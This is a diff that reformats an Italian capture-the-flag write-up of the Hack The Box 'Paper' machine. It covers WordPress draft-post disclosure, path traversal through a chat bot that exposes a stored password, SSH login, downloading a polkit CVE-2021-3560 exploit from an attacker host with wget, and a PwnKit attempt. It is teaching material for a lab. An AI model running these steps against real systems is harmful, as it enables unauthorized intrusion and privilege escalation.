@@ -1,8 +1,11 @@
+# Paper
+
 **TARGET: 10.10.11.143**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
 Per prima cosa lanciamo un veloce scan con [Nmap](Note/Tool/Nmap.md)
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/paper]
 └─# nmap -sC -sS -sV --min-rate=5000 10.10.11.143
@@ -42,17 +45,15 @@ Nmap done: 1 IP address (1 host up) scanned in 17.62 seconds
 
 Uno ulteriore scan su tutte le porte non ci da nessuna nuova informazione.
 
-# ENUMERATION
+## ENUMERATION
 
-# Port 80/443
+## Port 80/443
 
-Iniziamo a visitare `10.10.11.143:80` 
-![](../zzz_rev/attachments/paper.png)
-Entrambi i siti HTTP e HTTPS mostrano solo una pagina Apache CentOs predefinita:
+Iniziamo a visitare `10.10.11.143:80` ![](../zzz\_rev/attachments/paper.png) Entrambi i siti HTTP e HTTPS mostrano solo una pagina Apache CentOs predefinita:
 
 Sorprendentemente, la pagina predefinita non viene caricata come index.html su nessuna delle porte. Una nota interessante è che la pagina predefinita ritorna con una risposta HTTP 403 Forbidden (e non 200 OK). Non sono sicuro che significhi qualcosa, ma è interessante.
 
-Anche gli  HTTP response headers su 443 non forniscono alcuna informazione aggiuntiva. Ma c'è un'intestazione extra su 80:
+Anche gli  HTTP response headers su 443 non forniscono alcuna informazione aggiuntiva. Ma c'è un'intestazione extra su 80:
 
 ```
 HTTP/1.1 403 Forbidden 
@@ -69,16 +70,13 @@ Content-Type: text/html; charset=UTF-8
 
 Aggiungiamolo al nostro `/etc/hosts`
 
-# paper.office:80
+## paper.office:80
 
-Visitiamo `http://office.paper`
-![](../zzz_rev/attachments/paper1.png)
+Visitiamo `http://office.paper` ![](../zzz\_rev/attachments/paper1.png)
 
 Si tratta chiaramente di un'opera teatrale sull'azienda tratta dallo show televisivo "The Office", incentrato su un'azienda cartaria chiamata Dunder Mifflin.
 
-Ci sono tre post, tutti di Prisonmike, e tutti con un personaggio simile allo stupido capo dello show televisivo. C'è un commento su uno dei post che contiene un suggerimento:
-![](../zzz_rev/attachments/paper2.webp)
-Mi assicurerò di controllare le bozze dei post se riesco a trovare l'accesso.
+Ci sono tre post, tutti di Prisonmike, e tutti con un personaggio simile allo stupido capo dello show televisivo. C'è un commento su uno dei post che contiene un suggerimento: ![](../zzz\_rev/attachments/paper2.webp) Mi assicurerò di controllare le bozze dei post se riesco a trovare l'accesso.
 
 Esplorando un po il sito vediamo che realizzato in WordPress, potrebbe essere una buona idea utilizzare [Wpscn](Note/Tool/Wpscn.md) per analizzare eventuali vulnerabilità note sia nella versione che eventualmente nei plugin installati.
 
@@ -188,8 +186,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:16
 ```
 
-Wpscan rileva che la versione di WP è 5.2.3:
-Ci sono 32 vulnerabilità conosciute in questa versione ma in base all'indizio di prima ci contriamo su questa
+Wpscan rileva che la versione di WP è 5.2.3: Ci sono 32 vulnerabilità conosciute in questa versione ma in base all'indizio di prima ci contriamo su questa
 
 ```bash
  [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
@@ -220,45 +217,29 @@ Here are a few ways to manipulate the returned entries:
 In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
 ```
 
-Dobbiamo aggiungere al link `?static=1` e riusciamo a visualizzare il post segreto 
-![](../zzz_rev/attachments/paper3.png)
-si fa riferimento ad un sistema di chat per dipendenti al seguente url `http://chat.office.paper/register/8qozr226AhkCHZdyY`
+Dobbiamo aggiungere al link `?static=1` e riusciamo a visualizzare il post segreto ![](../zzz\_rev/attachments/paper3.png) si fa riferimento ad un sistema di chat per dipendenti al seguente url `http://chat.office.paper/register/8qozr226AhkCHZdyY`
 
-come possiamo vedere del url abbiamo un sottodominio `caht.office.paper` che andremo ad aggiungere al nostro `/etc/hosts` prima di visitarlo 
-![](../zzz_rev/attachments/paper4.png)
-Abbiamo un form di registrazione di `rocket.chat`
-ci registriamo e siamo dentro 
+come possiamo vedere del url abbiamo un sottodominio `caht.office.paper` che andremo ad aggiungere al nostro `/etc/hosts` prima di visitarlo ![](../zzz\_rev/attachments/paper4.png) Abbiamo un form di registrazione di `rocket.chat` ci registriamo e siamo dentro
 
-![](../zzz_rev/attachments/paper5.webp)
+![](../zzz\_rev/attachments/paper5.webp)
 
-Il canale `#general` ha un sacco di personaggi dello show televisivo e alcune belle battute, ma anche qualcosa su Dwight che programma un bot:
-![](../zzz_rev/attachments/paper6.webp)
+Il canale `#general` ha un sacco di personaggi dello show televisivo e alcune belle battute, ma anche qualcosa su Dwight che programma un bot: ![](../zzz\_rev/attachments/paper6.webp)
 
 I punti più interessanti:
 
-recyclops help mostrerà i comandi
-recyclops può ottenere file ed elencare file
-questo canale è di sola lettura
-recyclops può essere raggiunto tramite DM (messaggio diretto).
-![](../zzz_rev/attachments/paper7.png)
-Vediamo se possiamo muoverci tra le directory
+recyclops help mostrerà i comandi recyclops può ottenere file ed elencare file questo canale è di sola lettura recyclops può essere raggiunto tramite DM (messaggio diretto). ![](../zzz\_rev/attachments/paper7.png) Vediamo se possiamo muoverci tra le directory
 
-![](../zzz_rev/attachments/paper8.png)
-Ok possiamo muoverci tra le directory 
-vedo anche un user.txt ma mi da accesso negato.
+![](../zzz\_rev/attachments/paper8.png) Ok possiamo muoverci tra le directory vedo anche un user.txt ma mi da accesso negato.
 
-Cercando su google rocket.chat bot troviamo [questa pagina](https://github.com/RocketChat/hubot-rocketchat) dove vediamo che il file di configurazione del  bot e nel file  `.env` vediamo se lo troviamo 
+Cercando su google rocket.chat bot troviamo [questa pagina](https://github.com/RocketChat/hubot-rocketchat) dove vediamo che il file di configurazione del bot e nel file `.env` vediamo se lo troviamo
 
-![](../zzz_rev/attachments/paper9.png)
+![](../zzz\_rev/attachments/paper9.png)
 
-Ed eccolo qui al percorso `../hubot/.env` abbiamo un 
-user `recyclops` 
-e una password `Queenofblad3s!23`
+Ed eccolo qui al percorso `../hubot/.env` abbiamo un user `recyclops` e una password `Queenofblad3s!23`
 
-leggendo il file `etc/passwd` vediamo che `dwight`  è un utente normale con una directory home diversa da rocketchat
+leggendo il file `etc/passwd` vediamo che `dwight` è un utente normale con una directory home diversa da rocketchat
 
-![](../zzz_rev/attachments/paper10.png)Dato l'accesso ai file in /home/dwight, è logico che il bot venga eseguito come dwight. 
-perchiò proviamo ad accervi trammite ssh
+![](../zzz\_rev/attachments/paper10.png)Dato l'accesso ai file in /home/dwight, è logico che il bot venga eseguito come dwight. perchiò proviamo ad accervi trammite ssh
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/paper]
@@ -286,9 +267,9 @@ e1fc937f2dd51f0a60183222499255cf
 [dwight@paper ~]$
 ```
 
-# PRIVESC
+## PRIVESC
 
-Scarichiamo sulla macchina target [[LinEPAS.sh]] e lo eseguiamo 
+Scarichiamo sulla macchina target \[\[LinEPAS.sh]] e lo eseguiamo
 
 ```bash
 ════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
@@ -308,15 +289,15 @@ Vulnerable to CVE-2021-3560
 ```
 
 Possiamo vedere che il CVEs Check ci segnala che la macchina è vulnerabile alla [CVE-2021-3560](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
-> [!NOTA ] l'ultima versione di LinEPAS.sh (2023) NON rileva la CVE. ho trovato [questi](https://github.com/carlospolop/PEASS-ng/issues/339) riferimenti che sarebbero d'approfondire 
 
-## CVE-2021-3560-Polkit-Privilege-Esclation
+> \[!NOTA ] l'ultima versione di LinEPAS.sh (2023) NON rileva la CVE. ho trovato [questi](https://github.com/carlospolop/PEASS-ng/issues/339) riferimenti che sarebbero d'approfondire
 
-In Linux, polkit è un servizio di autorizzazione utilizzato per consentire ai processi non privilegiati di comunicare con processi privilegiati. Quando un utente o un processo con privilegi limitati desidera accedere a risorse che richiedono privilegi più elevati, il servizio di autorizzazione polkit prende una decisione di autorizzazione o negazione dietro le quinte oppure richiede una finestra di dialogo per ricevere ulteriore autorizzazione prima di concedere i privilegi necessari.
-CVE-2021-3560 è una vulnerabilità di bypass dell'autenticazione che consente a un utente normale di elevare i propri privilegi a quelli di un utente root. Questo difetto potrebbe essere utilizzato da un utente locale non privilegiato per creare un nuovo amministratore locale, il che si traduce nella completa compromissione del sistema. Informazioni dettagliate sul funzionamento di CVE-2021-3560 possono essere trovate qui.
+### CVE-2021-3560-Polkit-Privilege-Esclation
 
-Durante la ricerca, troviamo questo [PoC](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) su Github. 
-Scarichiamo questo exploit e trasferiamolo sull'host remoto. 
+In Linux, polkit è un servizio di autorizzazione utilizzato per consentire ai processi non privilegiati di comunicare con processi privilegiati. Quando un utente o un processo con privilegi limitati desidera accedere a risorse che richiedono privilegi più elevati, il servizio di autorizzazione polkit prende una decisione di autorizzazione o negazione dietro le quinte oppure richiede una finestra di dialogo per ricevere ulteriore autorizzazione prima di concedere i privilegi necessari. CVE-2021-3560 è una vulnerabilità di bypass dell'autenticazione che consente a un utente normale di elevare i propri privilegi a quelli di un utente root. Questo difetto potrebbe essere utilizzato da un utente locale non privilegiato per creare un nuovo amministratore locale, il che si traduce nella completa compromissione del sistema. Informazioni dettagliate sul funzionamento di CVE-2021-3560 possono essere trovate qui.
+
+Durante la ricerca, troviamo questo [PoC](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) su Github. Scarichiamo questo exploit e trasferiamolo sull'host remoto.
+
 ```bash
 [dwight@paper ~]$ wget 10.10.14.9:8000/poc.sh
 --2023-10-31 08:09:34--  http://10.10.14.9:8000/poc.sh
@@ -337,7 +318,7 @@ bot_restart.sh  hubot  poc.sh  sales  user.txt
 [dwight@paper ~]$
 ```
 
-Possiamo utilizzare le opzioni di flag disponibili nello script di prova per impostare il nome utente e la password desiderati per il nuovo utente oppure modificare direttamente il nome utente e la password codificati nel codice PoC stesso. 
+Possiamo utilizzare le opzioni di flag disponibili nello script di prova per impostare il nome utente e la password desiderati per il nuovo utente oppure modificare direttamente il nome utente e la password codificati nel codice PoC stesso.
 
 ```bash
 [dwight@paper ~]$ ./poc.sh -u=xrabbit -p=test123
@@ -393,7 +374,7 @@ ed ecco la nostra root flag
 957c77b4e47ddd8ec41c0a53b923874b
 ```
 
-## PwnKit
+### PwnKit
 
 LinEPAS ci suggerisce diversi vulnerabilità come possiamo vedere.
 
@@ -456,7 +437,7 @@ LinEPAS ci suggerisce diversi vulnerabilità come possiamo vedere.
    Comments: Requires an active PolKit agent.
 ```
 
-### PwnKit - Fail
+#### PwnKit - Fail
 
 CVE-2021-4034 è un altro bug scoperto da Qualys, questa volta in pkexec, denominato PwnKit. [Questo post](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) del blog entra in tutti i dettagli. L'exploit abusa della cattiva gestione di un argc vuoto (dove i parametri vengono passati a un programma Linux) per ottenere l'esecuzione tramite pkexec che viene eseguito come root (tramite SetUID) per impostazione predefinita.
 
@@ -505,7 +486,7 @@ GLib: Cannot convert message: Could not open converter from “UTF-8” to “PW
 pkexec must be setuid root
 ```
 
-### Re-SetUID pwnkit
+#### Re-SetUID pwnkit
 
 Come root, cambierò pkexec con le autorizzazioni SetUID:
 
